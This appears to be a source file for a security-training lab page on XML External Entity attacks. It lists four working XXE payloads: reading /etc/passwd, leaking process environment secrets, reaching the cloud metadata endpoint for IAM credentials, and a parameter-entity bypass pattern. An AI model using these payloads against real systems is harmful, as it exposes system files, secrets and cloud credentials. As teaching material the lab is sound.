import { GenericLab } from "./lab-generic";

const XXE_PAYLOADS = [
  {
    id: 501,
    label: "Classic file read",
    payload: `<?xml version="1.0"?>
<!DOCTYPE invoice [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<invoice><customer>&xxe;</customer></invoice>`,
    desc: "Defines an external entity that resolves a local file into the XML document.",
    bypass: false,
  },
  {
    id: 502,
    label: "Environment leak",
    payload: `<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY env SYSTEM "file:///proc/self/environ">]>
<data>&env;</data>`,
    desc: "Reads process environment data, a common path to secrets in real incidents.",
    bypass: false,
  },
  {
    id: 503,
    label: "Metadata SSRF through XXE",
    payload: `<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY meta SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<r>&meta;</r>`,
    desc: "Chains XML external entity resolution into cloud metadata access.",
    bypass: false,
  },
  {
    id: 504,
    label: "Parameter entity pattern",
    payload: `<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<r>&xxe;</r>`,
    desc: "Shows the structure used in more advanced blind XXE payloads.",
    bypass: true,
  },
];

export default function LabXxe() {
  return (
    <GenericLab
      title="XML External Entity"
      code="XXE"
      targetUrl="/api/lab/xxe/parse"
      queryParam="xml"
      payloads={XXE_PAYLOADS}
      hint="Inject a DOCTYPE with a SYSTEM external entity. The parser simulation resolves safe fake files and metadata."
    />
  );
}
